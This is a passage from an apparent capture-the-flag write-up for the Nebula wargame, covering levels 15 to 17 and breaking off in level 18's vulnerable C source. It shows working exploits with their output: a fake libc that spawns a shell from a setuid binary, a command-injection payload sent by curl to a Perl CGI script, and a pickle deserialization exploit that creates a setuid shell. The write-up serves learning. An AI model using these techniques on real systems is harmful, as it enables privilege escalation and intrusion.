</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -static-libgcc -fPIC -Wl,--version-script<span class="o">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>hi mom!
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>Yes! :D So even though I am causing <code>flag15</code> to crash, I have managed to introduce some code to it. I finally decided to add the <code>system()</code> call and recompile my fake libc.</p>

<p>So, to solve level15:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>cat fake_libc.c
</span><span class='line'><span class="c">#include&lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'>int __libc_start_main<span class="o">(</span>int <span class="o">(</span>*main<span class="o">)</span> <span class="o">(</span>int, char * *, char * *<span class="o">)</span>, int argc, char * * ubp_av, void <span class="o">(</span>*init<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>*rtld_fini<span class="o">)</span> <span class="o">(</span>void<span class="o">)</span>, void <span class="o">(</span>* stack_end<span class="o">))</span> <span class="o">{</span>
</span><span class='line'>    system<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'>    <span class="k">return </span>0<span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>gcc -shared -static-libgcc -fPIC -Wl,--version-script<span class="o">=</span>version.ld,-Bstatic fake_libc.c -o libc.so.6
</span><span class='line'>level15@nebula:/var/tmp/flag15<span class="nv">$ </span>~flag15/flag15
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level16</h2>

<p><a href="https://exploit-exercises.com/nebula/level16/">Level16&rsquo;s Description</a>:</p>

<blockquote><p>There is a perl script running on port 1616.</p></blockquote>


<p>With the description we are provided with the source code of a small Perl program:</p>

<figure class='code'><figcaption><span>index.pl</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/env perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">login</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>  <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="nb">tr</span><span class="sr">/a-z/</span><span class="n">A</span><span class="o">-</span><span class="n">Z</span><span class="o">/</span><span class="p">;</span> <span class="c1"># conver to uppercase</span>
</span><span class='line'>  <span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>        <span class="c1"># strip everything after a space</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`egrep &quot;^$username&quot; /home/flag16/userdb.txt 2&gt;&amp;1`</span><span class="p">;</span>
</span><span class='line'>  <span class="k">foreach</span> <span class="nv">$line</span> <span class="p">(</span><span class="nv">@output</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">(</span><span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pw</span><span class="p">)</span> <span class="o">=</span> <span class="nb">split</span><span class="p">(</span><span class="sr">/:/</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$pw</span> <span class="o">=~</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">htmlz</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login was accepted&lt;br/&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">print</span><span class="p">(</span><span class="s">&quot;Your login failed&lt;br/&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;\n&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">htmlz</span><span class="p">(</span><span class="n">login</span><span class="p">(</span><span class="n">param</span><span class="p">(</span><span class="s">&quot;username&quot;</span><span class="p">),</span> <span class="n">param</span><span class="p">(</span><span class="s">&quot;password&quot;</span><span class="p">)));</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script has a seemingly less obvious command injection vulnerability. The <code>egrep</code> command eventually gets the <code>$username</code> variable. This after it has gone through 2 sets of filters, one converting the username to uppercase and another truncating everything after a space. These filters are the core of the challenge.</p>

<p>Similarly to the other command injections, I replicated the filters so that I could print the output and see how I could manipulate them. The biggest problem being the fact that everything was converted to uppercase. Thankfully, that got sorted really quickly when I learnt of the <code>${A,,}</code> operator in bash. After quite a bit of trying different things, I finally got something that would work. I would first make the egrep happy by redirecting something to it to grep through. Once that was done, I declared a new variable <code>A</code> and set the command I wanted to run to it. Thereafter I converted it to lowercase and executed it wit <code>${A,,}</code> and commented the rest of the line out with a hash (#).</p>

<p>So, to solve level16:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level16@nebula:~<span class="nv">$ </span>vim /var/tmp/flag16.sh
</span><span class='line'>level16@nebula:~<span class="nv">$ </span>chmod +x /var/tmp/flag16.sh
</span><span class='line'>level16@nebula:~<span class="nv">$ </span>cat /var/tmp/flag16.sh
</span><span class='line'><span class="c">#!/bin/sh</span>
</span><span class='line'>gcc /var/tmp/shell.c -o /var/tmp/flag16
</span><span class='line'>chmod 4777 /var/tmp/flag16
</span></code></pre></td></tr></table></div></figure>


<p>On my host machine, I requested the web page hosting the perl script, triggering <code>/var/tmp/flag16</code> to run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>~ » curl -v <span class="s2">&quot;http://192.168.217.239:1616/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &quot;</span>username<span class="s2">&quot; : &quot;&quot;&quot;&quot;&lt;/etc/passwd;A=&quot;</span>/var/tmp/flag16.sh<span class="s2">&quot;;${A,,};#&quot;&quot;&quot;</span>, <span class="s2">&quot;password&quot;</span> : <span class="s2">&quot;a&quot;</span> <span class="o">})</span><span class="err">&#39;</span><span class="o">)</span><span class="err">&quot;</span>
</span><span class='line'>* Hostname was NOT found in DNS cache
</span><span class='line'>*   Trying 192.168.217.239...
</span><span class='line'>* Connected to 192.168.217.239 <span class="o">(</span>192.168.217.239<span class="o">)</span> port 1616 <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; GET /index.cgi?username<span class="o">=</span>%22%3C%2Fetc%2Fpasswd%3BA%3D%22%2Fvar%2Ftmp%2Fflag16.sh%22%3B%24%7BA%2C%2C%7D%3B%23<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>a HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.37.1
</span><span class='line'>&gt; Host: 192.168.217.239:1616
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt;
</span><span class='line'>* HTTP 1.0, assume close after body
</span><span class='line'>&lt; HTTP/1.0 200 OK
</span><span class='line'>&lt; Content-type: text/html
</span><span class='line'>&lt;
</span><span class='line'>&lt;html&gt;&lt;head&gt;&lt;title&gt;Login resuls&lt;/title&gt;&lt;/head&gt;&lt;body&gt;Your login failed&lt;br/&gt;Would you like a cookie?&lt;br/&gt;&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;
</span><span class='line'>* Closing connection 0
</span></code></pre></td></tr></table></div></figure>


<p>And then, just to read the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level16@nebula:~<span class="nv">$ </span>/var/tmp/flag16
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level17</h2>

<p><a href="https://exploit-exercises.com/nebula/level17/">Level17&rsquo;s Description</a>:</p>

<blockquote><p>There is a python script listening on port 10007 that contains a vulnerability.</p></blockquote>


<p>With the description we are provided with the source code of a small Python program:</p>

<figure class='code'><figcaption><span>level17.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="nb">import</span> <span class="n">os</span>
</span><span class='line'><span class="nb">import</span> <span class="n">pickle</span>
</span><span class='line'><span class="nb">import</span> <span class="nb">time</span>
</span><span class='line'><span class="nb">import</span> <span class="nb">socket</span>
</span><span class='line'><span class="nb">import</span> <span class="n">signal</span>
</span><span class='line'>
</span><span class='line'><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">def</span> <span class="n">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="nb">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="n">in</span> <span class="n">obj:</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="nb">send</span><span class="p">(</span><span class="s">&quot;why did you send me &quot;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">&quot;?\n&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">skt</span> <span class="o">=</span> <span class="nb">socket</span><span class="o">.</span><span class="nb">socket</span><span class="p">(</span><span class="nb">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="nb">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="nb">bind</span><span class="p">((</span><span class="s">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="nb">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span> <span class="n">True:</span>
</span><span class='line'>  <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="nb">accept</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="nb">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="nb">send</span><span class="p">(</span><span class="s">&quot;Accepted connection from %s:%d&quot;</span> <span class="nv">%</span> <span class="err">(</span><span class="nv">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>With this level, it was immediately obvious that user input was being used to unpickle. This is dangerous as user supplied code could be executed when the unpickle occurs. So, my plan was to write a simple class with a <code>__reduce__</code> method to pickle and send that over the socket that this code is listening on.</p>

<p>So, to solve level17:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>level17@nebula:/var/tmp/flag17-prep<span class="nv">$ </span>cat sploit.py
</span><span class='line'>from netcat import Netcat
</span><span class='line'>import pickle
</span><span class='line'>import os
</span><span class='line'>
</span><span class='line'><span class="nb">command</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;gcc /var/tmp/shell.c -o /var/tmp/flag17; chmod 4777 /var/tmp/flag17&quot;&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># setup the pickle</span>
</span><span class='line'>class DoCmd<span class="o">(</span>object<span class="o">)</span>:
</span><span class='line'>    def __reduce__<span class="o">(</span>self<span class="o">)</span>:
</span><span class='line'>        <span class="k">return</span> <span class="o">(</span>os.system, <span class="o">(</span><span class="s1">&#39;{cmd}&#39;</span>.format<span class="o">(</span><span class="nv">cmd</span> <span class="o">=</span> <span class="nb">command</span><span class="o">)</span>,<span class="o">))</span>
</span><span class='line'>
</span><span class='line'><span class="nv">nc</span> <span class="o">=</span>  Netcat<span class="o">(</span><span class="s1">&#39;127.0.0.1&#39;</span>, 10007<span class="o">)</span>
</span><span class='line'>nc.read<span class="o">()</span>
</span><span class='line'>nc.write<span class="o">(</span>pickle.dumps<span class="o">(</span>DoCmd<span class="o">()))</span>
</span><span class='line'>nc.close<span class="o">()</span>
</span><span class='line'>
</span><span class='line'>level17@nebula:/var/tmp/flag17-prep<span class="nv">$ </span>python sploit.py
</span><span class='line'>level17@nebula:/var/tmp/flag17-prep<span class="nv">$ </span>/var/tmp/flag17
</span><span class='line'>sh-4.2<span class="nv">$ </span>getflag
</span><span class='line'>You have successfully executed getflag on a target account
</span></code></pre></td></tr></table></div></figure>


<h2>level18</h2>

<p><a href="https://exploit-exercises.com/nebula/level18/">Level18&rsquo;s Description</a>:</p>

<blockquote><p>Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.</p></blockquote>


<p>With the description we are provided with the source code of a small C program:</p>

<figure class='code'><figcaption><span>level18.c</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;getopt.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">globals</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define dprintf(...) if(globals.debugfile) \</span>
</span><span class='line'><span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>
</span><span class='line'><span class="cp">#define dvprintf(num, ...) if(globals.debugfile &amp;&amp; globals.verbose &gt;= num) \</span>
</span><span class='line'><span class="cp">  fprintf(globals.debugfile, __VA_ARGS__)</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PWFILE &quot;/home/flag18/password&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Unable to read password file %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
</span><span class='line'>          <span class="k">return</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>                <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;logged in successfully (with%s password file)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="s">&quot;out&quot;</span> <span class="o">:</span> <span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;--&gt; [%s] is unsupported at this current time.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">&quot;unable to set user to &#39;%s&#39; -- not supported.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">&quot;d:v&quot;</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">switch</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">case</span> <span class="sc">&#39;d&#39;</span>:
